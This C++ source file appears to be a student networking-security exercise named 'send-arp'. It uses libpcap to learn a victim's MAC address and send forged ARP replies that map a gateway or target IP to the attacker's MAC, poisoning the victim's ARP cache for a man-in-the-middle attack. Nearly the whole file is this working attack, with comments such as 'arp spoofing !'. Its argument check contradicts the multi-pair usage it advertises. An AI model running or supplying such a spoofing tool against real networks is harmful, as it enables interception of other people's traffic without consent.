#include <cstdio>
#include <pcap.h>
#include "utils.h"
#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	string interface = argv[1];

	Mac attacker_mac;
	Ip attacker_ip;
	getAttackerInfo(interface, attacker_mac, attacker_ip);
	cout << "Attacker's MAC address : " << string(attacker_mac) << "\n";
	cout << "Attacker's IP address : " << string(attacker_ip) << "\n";
	
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	for(int i=1;i<argc/2;i+=1){
		Ip sender_ip = Ip(argv[i*2]);
		
		Ip target_ip = Ip(argv[i*2+1]);
		cout << "sender : "<< string(sender_ip)<< " target : "<< string(target_ip)<< "\n";
		Mac sender_mac;
		// get sender's MAC address
		getSenderInfo(handle, sender_mac, sender_ip, attacker_mac, attacker_ip);
		cout << "get clear\n";
		// arp spoofing !
		// send fake arp reply 
		// replace target ip(gateway ip) matches to attacker mac
		cout << "Trying attack.. victim " << string(sender_mac) << " will send to attacker "<< string(attacker_mac) << 
		" now !\n";
		sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);

	}

	pcap_close(handle);
}
